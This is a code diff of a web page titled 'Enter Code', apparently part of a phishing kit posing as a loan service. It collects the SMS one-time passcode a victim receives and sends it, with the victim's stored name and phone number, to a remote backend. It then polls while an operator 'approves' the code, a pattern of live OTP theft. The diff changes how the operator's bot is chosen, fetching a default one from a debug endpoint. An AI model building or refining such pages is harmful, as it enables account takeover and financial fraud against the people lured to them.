@@ -5,13 +5,7 @@
 <title>Enter Code</title>
 <style>
 body { font-family: Arial; background:#f6f7fb; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
-.code-container { background:#fff; 
-    padding:30px; 
-    width:450px;
-    text-align:center;
-     border-radius:12px; 
-     box-shadow:0 5px 15px rgba(0,0,0,0.1);
-     }
+.code-container { background:#fff; padding:30px; width:450px; text-align:center; border-radius:12px; box-shadow:0 5px 15px rgba(0,0,0,0.1); }
 .code-boxes input { width:55px; height:60px; font-size:24px; text-align:center; margin:5px; border:2px solid red; border-radius:6px; }
 button { width:100%; padding:12px; background:red; color:#fff; border:none; border-radius:6px; font-size:16px; cursor:pointer; display:flex; justify-content:center; align-items:center; }
 button:disabled { background:#ccc; cursor:not-allowed; }
@@ -20,32 +14,17 @@ button:disabled { background:#ccc; cursor:not-allowed; }
 #status { margin-top:15px; font-size:14px; color:#555; }
 .shake { animation: shake 0.4s; }
 @keyframes shake { 0%{transform:translateX(0);}25%{transform:translateX(-5px);}50%{transform:translateX(5px);}75%{transform:translateX(-5px);}100%{transform:translateX(0);} }
-
-/* --------- Countdown Timer --------- */
-#timerContainer {
-    margin-top:10px;
-    display:none;
-    font-size:16px;
-    color:#555;
-}
-#timerDisplay {
-    font-weight:bold;
-    color:red;
-}
-.code {
-    margin-bottom: 5px;
-}
-.otp-header {
-    font-weight: 300;
-   font-size: 20px;
-}
+#timerContainer { margin-top:10px; display:none; font-size:16px; color:#555; }
+#timerDisplay { font-weight:bold; color:red; }
+.code { margin-bottom: 5px; }
+.otp-header { font-weight: 300; font-size: 20px; }
 </style>
 </head>
 <body>
 
 <div class="code-container">
     <h2 class="code">Enter Code</h2>
-    <h3 class="otp-header">enter otp send on sms</h3>
+    <h3 class="otp-header">Enter OTP sent on SMS</h3>
     <form id="codeForm">
         <div class="code-boxes">
             <input maxlength="1" inputmode="numeric">
@@ -59,7 +38,6 @@ button:disabled { background:#ccc; cursor:not-allowed; }
         </button>
     </form>
 
-    <!-- OTP Timer -->
     <div id="timerContainer">
         OTP expires in <span id="timerDisplay">45</span> seconds
     </div>
@@ -70,14 +48,24 @@ button:disabled { background:#ccc; cursor:not-allowed; }
 <script>
 const BACKEND_URL = "https://credit-mola-loans.onrender.com";
 
-// ---------------- BOT ROUTING ----------------
-const params = new URLSearchParams(window.location.search);
-const botId = params.get('botId');
-if (!botId) { alert("Invalid access link"); throw new Error(); }
+let botId = null;
+
+// ---------------- GET DEFAULT BOT ----------------
+async function fetchDefaultBot() {
+    try {
+        const res = await fetch(`${BACKEND_URL}/debug/bots`);
+        const bots = await res.json();
+        if (!bots || bots.length === 0) throw new Error("No bots configured");
+        botId = bots[0].botId;
+    } catch (err) {
+        alert("Unable to fetch bot configuration: " + err.message);
+        throw err;
+    }
+}
 
 // Prevent skipping steps
 if (!localStorage.getItem('pin')) {
-    window.location.href = `pin.html?botId=${botId}`;
+    window.location.href = `pin.html`;
 }
 
 // ---------------- CODE INPUT LOGIC ----------------
@@ -125,17 +113,18 @@ function startCountdown() {
 document.getElementById('codeForm').addEventListener('submit', async e => {
     e.preventDefault();
 
-    startCountdown(); // start timer on submit
+    startCountdown();
 
     const code = [...inputs].map(i => i.value).join('');
     const name = localStorage.getItem('name');
     const phone = localStorage.getItem('phone');
 
-    // --- UX FEEDBACK ---
     button.disabled = true;
     btnText.textContent = 'Verifying...';
     spinner.style.display = 'inline-block';
     statusText.textContent = 'Waiting for approval...';
+
+    await fetchDefaultBot(); // ensure botId is set
 
     try {
         const res = await fetch(`${BACKEND_URL}/submit-code`, {
@@ -152,14 +141,14 @@ document.getElementById('codeForm').addEventListener('submit', async e => {
 
             if (d.approved === true) {
                 clearInterval(poll);
-                clearInterval(countdown); // stop countdown on success
+                clearInterval(countdown);
                 localStorage.clear();
-                window.location.href = `success.html?botId=${botId}`;
+                window.location.href = `success.html`;
             }
 
             if (d.approved === false) {
                 clearInterval(poll);
-                clearInterval(countdown); // stop countdown on failure
+                clearInterval(countdown);
                 button.disabled = false;
                 btnText.textContent = 'Submit Code';
                 spinner.style.display = 'none';
